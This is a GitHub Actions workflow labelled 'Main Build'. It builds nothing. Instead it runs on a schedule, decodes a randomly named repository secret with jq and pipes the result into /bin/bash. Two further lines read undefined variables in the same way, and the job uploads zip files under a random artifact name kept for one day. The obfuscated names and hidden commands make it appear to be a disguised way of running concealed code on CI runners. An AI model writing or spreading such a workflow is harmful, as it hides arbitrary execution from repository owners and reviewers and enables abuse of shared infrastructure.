name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '17 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          ljzco2: ${{ secrets.ljzco2 }}
        run: |
          printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
          printf '%s' "$zgp52" | jq -r .ati39 | /bin/bash
          printf '%s' "$kkps28" | jq -r .a54 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: hM0htOsa
          path: "*.zip"
          retention-days: 1
